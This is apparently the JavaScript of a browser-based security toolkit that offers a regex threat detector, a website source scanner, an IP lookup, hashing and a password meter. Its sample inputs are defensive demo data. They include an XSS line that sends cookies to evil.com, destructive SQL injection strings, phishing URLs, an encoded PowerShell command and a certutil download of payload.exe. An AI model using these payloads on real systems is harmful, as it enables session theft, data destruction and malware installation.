function showInfo(tool) {
  const msgs = {
    threat: "Checks URLs and snippets for XSS, SQLi, insecure protocols, eval().",
    webscan: "Fetches a live website's HTML source code and scans it for XSS, SQLi, phishing patterns, insecure forms, mixed content, and more.",
    ip: "Uses ipapi.co to grab live geo-location and ISP data.",
    hash: "Generates secure one-way cryptographic hashes using Web Crypto API."
  };
  alert(msgs[tool]);
}

const sampleThreats = {
  xss: `<script>document.location='http://evil.com/steal?c='+document.cookie</script>
<img src=x onerror="alert('XSS')">
<svg/onload=eval(atob('YWxlcnQoMSk='))>`,

  sqli: `' OR 1=1 --
admin'; DROP TABLE users;--
" UNION SELECT username, password FROM users--`,

  phishing: `http://secure-login-paypal.verify-account.com/signin
http://microsoft-support.account-verify.top/reset
http://amaz0n.com.suspicious-domain.tk/update-billing`,

  malware: `powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcw==
var _0x3f2a=["\x68\x74\x74\x70"];eval(String.fromCharCode(100,111,99,117));
certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\svchost.exe`
};

function setSampleThreat(type) {
  const input = document.getElementById("threatInput");
  if (!input || !sampleThreats[type]) return;
  input.value = sampleThreats[type];
  input.style.borderColor = "#ff6060";
  setTimeout(() => { input.style.borderColor = ''; }, 600);
  detectThreat();
}

function detectThreat() {
  const raw = document.getElementById("threatInput").value;
  const input = raw.toLowerCase();
  let threats = [];

  if (!raw.trim()) {
    const resultEl = document.getElementById("threatResult");
    if (resultEl) { resultEl.innerHTML = "⏳ Paste or select a sample to scan"; resultEl.style.color = "#ffaa40"; resultEl.style.borderColor = "rgba(255,170,64,0.3)"; }
    return;
  }

  if (/<script[\s>]/i.test(raw))                          threats.push("🔴 XSS: Inline <script> tag detected");
  if (/on(error|load|click|mouseover|focus)\s*=/i.test(raw)) threats.push("🔴 XSS: Event handler injection (onerror/onload/onclick)");
  if (/javascript\s*:/i.test(raw))                        threats.push("🔴 XSS: javascript: URI scheme detected");
  if (/<(img|svg|iframe|embed|object|body)[^>]*>/i.test(raw) && /on\w+\s*=/i.test(raw))
                                                           threats.push("🔴 XSS: Malicious HTML tag with event handler");
  if (/document\.(cookie|write|location)/i.test(raw))     threats.push("🔴 XSS: DOM manipulation / cookie access");
  if (/eval\s*\(/i.test(raw))                             threats.push("🔴 XSS: Dangerous eval() execution");
  if (/atob\s*\(/i.test(raw))                             threats.push("🟠 XSS: Base64 decode (atob) — possible obfuscation");
  if (/String\.fromCharCode/i.test(raw))                  threats.push("🟠 XSS: String.fromCharCode obfuscation");

  if (/'\s*(or|and)\s+[\d'"].*[=]/i.test(raw))            threats.push("🔴 SQLi: Classic OR/AND injection pattern");
  if (/--\s*$/m.test(raw) || input.includes("--"))        threats.push("🔴 SQLi: SQL comment (--) termination");
  if (/;\s*(drop|delete|update|insert)\s/i.test(raw))     threats.push("🔴 SQLi: Destructive SQL statement (DROP/DELETE)");
  if (/union\s+(all\s+)?select/i.test(raw))               threats.push("🔴 SQLi: UNION SELECT data extraction");
  if (/'\s*;\s*--/i.test(raw))                            threats.push("🔴 SQLi: Quote-break with comment");

  if (/http:\/\//i.test(raw))                             threats.push("🟠 Phishing: Insecure HTTP link (not HTTPS)");
  if (/(paypal|apple|microsoft|google|amazon|amaz0n|netflix|bank)/i.test(raw) &&
      /\.(tk|ml|ga|cf|top|xyz|bit|gq|buzz|click|cam)\b/i.test(raw))
                                                           threats.push("🔴 Phishing: Known brand + suspicious TLD");
  if (/(login|signin|verify|account|update|billing|secure)/i.test(raw) &&
      /(\.com\.|\.net\.|suspicious|verify-account|account-verify)/i.test(raw))
                                                           threats.push("🔴 Phishing: Credential harvesting URL pattern");
  if (/[a-z0-9]{20,}\.(tk|ml|ga|cf|gq)/i.test(raw))      threats.push("🟠 Phishing: Random domain on free TLD");

  if (/powershell\s+(-\w+\s+)*(enc|encodedcommand|bypass|hidden)/i.test(raw))
                                                           threats.push("🔴 Malware: Encoded PowerShell command");
  if (/certutil\s.*-urlcache/i.test(raw))                 threats.push("🔴 Malware: Certutil download abuse (LOLBin)");
  if (/\.(exe|scr|bat|cmd|ps1|vbs|js|hta|wsf)\b/i.test(raw) && /http/i.test(raw))
                                                           threats.push("🔴 Malware: Executable download link");
  if (/\\x[0-9a-f]{2}/i.test(raw) && raw.length > 30)    threats.push("🟠 Malware: Hex-encoded payload detected");
  if (/_0x[a-f0-9]+/i.test(raw))                          threats.push("🔴 Malware: Obfuscated JavaScript variable");
  if (/eval\s*\(\s*String\.fromCharCode/i.test(raw))      threats.push("🔴 Malware: eval + fromCharCode execution chain");

  threats = [...new Set(threats)];

  const resultEl = document.getElementById("threatResult");
  if (!resultEl) return;

  if (threats.length === 0) {
    resultEl.innerHTML = "✅ No apparent threats detected — input looks safe.";
    resultEl.style.color = "#00ff88";
    resultEl.style.borderColor = "rgba(0,255,136,0.3)";
  } else {
    const severity = threats.some(t => t.startsWith("🔴")) ? "CRITICAL" : "WARNING";
    const sevColor = severity === "CRITICAL" ? "#ff3c3c" : "#ffaa40";
    resultEl.innerHTML =
      `<div style="margin-bottom:8px;font-size:0.95rem;color:${sevColor};font-weight:700">⚠ ${severity}: ${threats.length} threat(s) found</div>` +
      threats.join("<br>");
    resultEl.style.color = "#ff6060";
    resultEl.style.borderColor = "#ff6060";
  }
}

async function lookupRealIP() {
  const ip = document.getElementById('ipInput')?.value.trim();
  const url = ip ? 'https://ipapi.co/'+ip+'/json/' : 'https://ipapi.co/json/';
  const res = document.getElementById('ipResultArea');
  if(!res) return;
  res.innerHTML = "Looking up...";
  try {
    const response = await fetch(url);
    const data = await response.json();
    if(data.error) throw new Error(data.reason);
    res.innerHTML = `IP: ${data.ip}<br>Location: ${data.city}, ${data.country_name}<br>ISP: ${data.org}`;
  } catch(e) { res.innerHTML = "❌ " + e.message; }
}

let currentHashAlgo = 'SHA-1';
async function setRealHashType(algo, btn) {
  currentHashAlgo = algo;
  document.querySelectorAll('.hash-pill').forEach(p => p.classList.remove('active'));
  btn.classList.add('active');
  generateRealHash();
}
async function generateRealHash() {
  const inputEl = document.getElementById('hashInput');
  const resEl = document.getElementById('realHashResult');
  if(!inputEl || !resEl) return;
  
  const input = inputEl.value;
  if(!input) return;
  const hash = await crypto.subtle.digest(currentHashAlgo, new TextEncoder().encode(input));
  const hex = Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('');
  resEl.innerHTML = `${currentHashAlgo}: ${hex}`;
}

function togglePasswordVisibility() {
  const input = document.getElementById("pwAnalyzerInput");
  const btn = document.getElementById("pwToggleBtn");
  if(input.type === "password") {
    input.type = "text";
    btn.textContent = "🙈";
  } else {
    input.type = "password";
    btn.textContent = "👁️";
  }
}

function checkPasswordStrength() {
  const val = document.getElementById("pwAnalyzerInput").value;
  const meter = document.getElementById("pwMeterFill");
  const scoreText = document.getElementById("pwScoreText");
  const feedback = document.getElementById("pwFeedbackText");
  
  if(!val) {
    meter.style.width = "0%";
    scoreText.textContent = "Score: 0%";
    feedback.textContent = "Waiting for input...";
    feedback.style.color = "var(--dim)";
    return;
  }
  
  let score = 0;
  let suggestions = [];
  
  if(val.length > 0) score += 10;
  if(val.length >= 8) score += 15;
  if(val.length >= 12) score += 20;
  else if(val.length < 8) suggestions.push("Make it longer");
  
  if(/[a-z]/.test(val)) score += 10;
  if(/[A-Z]/.test(val)) score += 15;
  else suggestions.push("Add uppercase");
  
  if(/[0-9]/.test(val)) score += 15;
  else suggestions.push("Add numbers");
  
  if(/[^a-zA-Z0-9]/.test(val)) score += 15;
  else suggestions.push("Add symbols");
  
  if(/(password|1234|qwerty|admin)/i.test(val)) {
    score -= 30;
    suggestions.push("Contains common patterns");
  }
  
  score = Math.max(0, Math.min(100, score));
  
  meter.style.width = score + "%";
  scoreText.textContent = `Score: ${score}%`;
  
  if(score < 40) {
    meter.style.background = "#ff6060";
    feedback.style.color = "#ff6060";
    feedback.textContent = suggestions[0] || "Weak";
  } else if(score < 80) {
    meter.style.background = "#ffaa40";
    feedback.style.color = "#ffaa40";
    feedback.textContent = suggestions[0] || "Moderate";
  } else {
    meter.style.background = "#00ff88";
    feedback.style.color = "#00ff88";
    feedback.textContent = "Strong Password ✅";
  }
}

async function scanWebsite() {
  const urlInput = document.getElementById('webscanUrl');
  const resultEl = document.getElementById('webscanResult');
  const progressEl = document.getElementById('webscanProgress');
  const meterEl = document.getElementById('webscanMeter');
  const stageEl = document.getElementById('webscanStage');
  const percentEl = document.getElementById('webscanPercent');
  const scanBtn = document.getElementById('webscanBtn');
  if (!urlInput || !resultEl) return;

  let url = urlInput.value.trim();
  if (!url) { resultEl.innerHTML = '❌ Please enter a website URL'; return; }
  if (!url.startsWith('http://') && !url.startsWith('https://')) url = 'https://' + url;

  scanBtn.disabled = true;
  scanBtn.textContent = '⏳ SCANNING...';
  progressEl.style.display = 'block';
  resultEl.innerHTML = '';

  function setProgress(pct, stage) {
    meterEl.style.width = pct + '%';
    percentEl.textContent = pct + '%';
    stageEl.textContent = stage;
  }

  setProgress(5, '🔗 Connecting to target...');

  try {
    const proxies = [
      'https://api.allorigins.win/raw?url=' + encodeURIComponent(url),
      'https://corsproxy.io/?' + encodeURIComponent(url),
      'https://api.codetabs.com/v1/proxy?quest=' + encodeURIComponent(url)
    ];

    setProgress(15, '📡 Fetching page source code...');
    let html = null;
    for (const proxy of proxies) {
      try {
        const resp = await fetch(proxy, { signal: AbortSignal.timeout(12000) });
        if (resp.ok) { html = await resp.text(); break; }
      } catch(e) { continue; }
    }

    if (!html || html.length < 20) {
      throw new Error('Could not fetch website. The site may block automated requests.');
    }

    setProgress(35, '🔍 Analyzing HTML structure...');
    await new Promise(r => setTimeout(r, 400));

    const findings = [];
    const htmlLower = html.toLowerCase();

    setProgress(45, '⚡ Scanning for XSS vulnerabilities...');
    await new Promise(r => setTimeout(r, 300));

    const inlineScripts = (html.match(/<script[^>]*>[\s\S]*?<\/script>/gi) || []);
    const inlineCount = inlineScripts.filter(s => !s.match(/src\s*=/i)).length;
    if (inlineCount > 0) findings.push({ sev: 'MEDIUM', cat: 'XSS', msg: `${inlineCount} inline <script> block(s) found — potential XSS vector` });

    if (/on(error|load|click|mouseover|focus|blur|submit|change)\s*=\s*["']/i.test(html))
      findings.push({ sev: 'HIGH', cat: 'XSS', msg: 'Inline event handlers detected (onerror, onclick, etc.)' });

    if (/javascript\s*:/i.test(html))
      findings.push({ sev: 'HIGH', cat: 'XSS', msg: 'javascript: URI scheme found in page' });

    if (/document\.(cookie|write|location)/i.test(html))
      findings.push({ sev: 'HIGH', cat: 'XSS', msg: 'Direct DOM access (document.cookie/write/location)' });

    if (/eval\s*\(/i.test(html))
      findings.push({ sev: 'HIGH', cat: 'XSS', msg: 'eval() usage detected — code injection risk' });

    if (/innerHTML\s*=/i.test(html))
      findings.push({ sev: 'MEDIUM', cat: 'XSS', msg: 'innerHTML assignment found — DOM XSS risk' });

    if ((html.match(/<script[^>]*src\s*=\s*["']https?:\/\/(?!.*(?:googleapis|gstatic|cloudflare|jquery|cdnjs|unpkg|jsdelivr|bootstrapcdn))[^"']*/gi) || []).length > 0)
      findings.push({ sev: 'MEDIUM', cat: 'XSS', msg: 'External scripts loaded from third-party domains' });

    setProgress(55, '💉 Checking for SQLi patterns...');
    await new Promise(r => setTimeout(r, 300));

    const forms = html.match(/<form[\s\S]*?<\/form>/gi) || [];
    const inputFields = html.match(/<input[^>]*>/gi) || [];
    const textInputs = inputFields.filter(i => /type\s*=\s*["'](text|search|hidden|password)["']/i.test(i) || !/type\s*=/i.test(i));

    if (textInputs.length > 0 && forms.length > 0)
      findings.push({ sev: 'INFO', cat: 'SQLi', msg: `${forms.length} form(s) with ${textInputs.length} text input(s) — potential injection points` });

    if (/(select|insert|update|delete|drop)\s+(from|into|table|where)/i.test(html))
      findings.push({ sev: 'CRITICAL', cat: 'SQLi', msg: 'Raw SQL keywords found in page source!' });

    if (/\?[\w]+=.*(&[\w]+=.*){0,}/i.test(html) && /(id|user|page|cat|item)\s*=/i.test(html))
      findings.push({ sev: 'MEDIUM', cat: 'SQLi', msg: 'URL parameters with common injectable names (id, user, page)' });

    setProgress(65, '🎣 Detecting phishing indicators...');
    await new Promise(r => setTimeout(r, 300));

    if (/<form[^>]*action\s*=\s*["']https?:\/\/(?!.*(?:google|facebook|microsoft|apple))/i.test(html))
      findings.push({ sev: 'MEDIUM', cat: 'PHISHING', msg: 'Form submits data to an external URL' });

    if (/<input[^>]*type\s*=\s*["']password["']/i.test(html))
      findings.push({ sev: 'INFO', cat: 'PHISHING', msg: 'Password input field found — check if legitimate' });

    if (/type\s*=\s*["']hidden["']/i.test(html)) {
      const hiddenCount = (html.match(/type\s*=\s*["']hidden["']/gi) || []).length;
      if (hiddenCount > 3)
        findings.push({ sev: 'LOW', cat: 'PHISHING', msg: `${hiddenCount} hidden input fields — may be used for data harvesting` });
    }

    setProgress(75, '🔒 Checking security practices...');
    await new Promise(r => setTimeout(r, 300));

    if (url.startsWith('http://') && !url.includes('localhost'))
      findings.push({ sev: 'HIGH', cat: 'SECURITY', msg: 'Website uses insecure HTTP (not HTTPS)' });

    const httpResources = (html.match(/src\s*=\s*["']http:\/\//gi) || []).length +
                          (html.match(/href\s*=\s*["']http:\/\//gi) || []).length;
    if (httpResources > 0 && url.startsWith('https://'))
      findings.push({ sev: 'MEDIUM', cat: 'SECURITY', msg: `${httpResources} mixed content resource(s) loaded over HTTP` });

    if (/<meta[^>]*http-equiv\s*=\s*["']Content-Security-Policy["']/i.test(html))
      findings.push({ sev: 'GOOD', cat: 'SECURITY', msg: 'Content-Security-Policy meta tag found ✅' });
    else
      findings.push({ sev: 'LOW', cat: 'SECURITY', msg: 'No Content-Security-Policy meta tag detected' });

    if (/<meta[^>]*name\s*=\s*["']referrer["']/i.test(html))
      findings.push({ sev: 'GOOD', cat: 'SECURITY', msg: 'Referrer-Policy meta tag found ✅' });

    if (/<iframe[^>]*>/i.test(html)) {
      const iframeCount = (html.match(/<iframe/gi) || []).length;
      findings.push({ sev: 'MEDIUM', cat: 'SECURITY', msg: `${iframeCount} iframe(s) found — possible clickjacking or injection` });
    }

    setProgress(85, '🦠 Scanning for malware patterns...');
    await new Promise(r => setTimeout(r, 300));

    if (/String\.fromCharCode/i.test(html))
      findings.push({ sev: 'HIGH', cat: 'MALWARE', msg: 'String.fromCharCode — possible obfuscated code' });

    if (/atob\s*\(/i.test(html) && /eval\s*\(/i.test(html))
      findings.push({ sev: 'CRITICAL', cat: 'MALWARE', msg: 'eval(atob(...)) — base64 encoded execution chain!' });

    if (/_0x[a-f0-9]+/i.test(html))
      findings.push({ sev: 'HIGH', cat: 'MALWARE', msg: 'Obfuscated JavaScript variables (_0x...) detected' });

    if (/\\x[0-9a-f]{2}/i.test(html) && html.length > 500)
      findings.push({ sev: 'MEDIUM', cat: 'MALWARE', msg: 'Hex-encoded strings found in source' });

    if (/document\.write\s*\(/i.test(html))
      findings.push({ sev: 'MEDIUM', cat: 'MALWARE', msg: 'document.write() used — can be exploited for injection' });

    setProgress(95, '📊 Generating report...');
    await new Promise(r => setTimeout(r, 400));

    const title = (html.match(/<title[^>]*>([\s\S]*?)<\/title>/i) || [,'(no title)'])[1].trim().substring(0, 80);
    const scriptCount = (html.match(/<script/gi) || []).length;
    const linkCount = (html.match(/<link/gi) || []).length;
    const sizeKB = (html.length / 1024).toFixed(1);

    setProgress(100, '✅ Scan complete!');

    const sevColors = { CRITICAL: '#ff3c3c', HIGH: '#ff6060', MEDIUM: '#ffaa40', LOW: '#d0a030', INFO: '#00cfff', GOOD: '#00ff88' };
    const sevIcons = { CRITICAL: '🔴', HIGH: '🟠', MEDIUM: '🟡', LOW: '🔵', INFO: 'ℹ️', GOOD: '✅' };

    const critCount = findings.filter(f => f.sev === 'CRITICAL').length;
    const highCount = findings.filter(f => f.sev === 'HIGH').length;
    const medCount = findings.filter(f => f.sev === 'MEDIUM').length;
    const goodCount = findings.filter(f => f.sev === 'GOOD').length;
    const totalIssues = findings.filter(f => f.sev !== 'GOOD' && f.sev !== 'INFO').length;

    let riskLevel = 'LOW RISK';
    let riskColor = '#00ff88';
    if (critCount > 0) { riskLevel = 'CRITICAL RISK'; riskColor = '#ff3c3c'; }
    else if (highCount > 0) { riskLevel = 'HIGH RISK'; riskColor = '#ff6060'; }
    else if (medCount > 0) { riskLevel = 'MEDIUM RISK'; riskColor = '#ffaa40'; }

    let report = `<div style="margin-bottom:14px;padding:12px;background:rgba(0,0,0,0.3);border-radius:8px;border-left:4px solid ${riskColor}">`;
    report += `<div style="font-size:1.1rem;font-weight:700;color:${riskColor};margin-bottom:6px">🛡️ ${riskLevel}</div>`;
    report += `<div style="color:var(--dim);font-size:0.8rem;">Target: <span style="color:#fff">${url}</span></div>`;
    report += `<div style="color:var(--dim);font-size:0.8rem;">Title: <span style="color:#fff">${title}</span></div>`;
    report += `<div style="color:var(--dim);font-size:0.8rem;">Size: ${sizeKB}KB · ${scriptCount} scripts · ${linkCount} stylesheets</div>`;
    report += `</div>`;

    report += `<div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:14px;font-size:0.78rem;font-family:var(--mono)">`;
    if (critCount) report += `<span style="color:#ff3c3c">🔴 ${critCount} Critical</span>`;
    if (highCount) report += `<span style="color:#ff6060">🟠 ${highCount} High</span>`;
    if (medCount) report += `<span style="color:#ffaa40">🟡 ${medCount} Medium</span>`;
    if (goodCount) report += `<span style="color:#00ff88">✅ ${goodCount} Good</span>`;
    report += `<span style="color:var(--dim)">Total: ${findings.length} findings</span>`;
    report += `</div>`;

    const categories = ['XSS', 'SQLi', 'PHISHING', 'SECURITY', 'MALWARE'];
    const catNames = { XSS: '⚡ Cross-Site Scripting (XSS)', SQLi: '💉 SQL Injection', PHISHING: '🎣 Phishing Indicators', SECURITY: '🔒 Security Practices', MALWARE: '🦠 Malware / Obfuscation' };

    for (const cat of categories) {
      const catFindings = findings.filter(f => f.cat === cat);
      if (catFindings.length === 0) continue;
      report += `<div style="margin-bottom:10px;">`;
      report += `<div style="font-size:0.82rem;font-weight:600;color:#fff;margin-bottom:5px;border-bottom:1px solid rgba(255,255,255,0.1);padding-bottom:4px">${catNames[cat] || cat}</div>`;
      for (const f of catFindings) {
        report += `<div style="padding:3px 0;font-size:0.78rem;color:${sevColors[f.sev]}">${sevIcons[f.sev]} [${f.sev}] ${f.msg}</div>`;
      }
      report += `</div>`;
    }

    if (findings.length === 0) {
      report += `<div style="color:#00ff88;font-size:0.9rem;text-align:center;padding:20px">✅ No obvious vulnerabilities detected. This looks clean!</div>`;
    }

    resultEl.innerHTML = report;
    resultEl.style.borderColor = riskColor;

  } catch(err) {
    resultEl.innerHTML = `❌ Scan failed: ${err.message}<br><span style="color:var(--dim);font-size:0.75rem">Tip: Some sites block external access. Try a different URL.</span>`;
    resultEl.style.borderColor = '#ff6060';
  } finally {
    scanBtn.disabled = false;
    scanBtn.textContent = '🔍 SCAN WEBSITE';
    setTimeout(() => { progressEl.style.display = 'none'; }, 2000);
  }
}
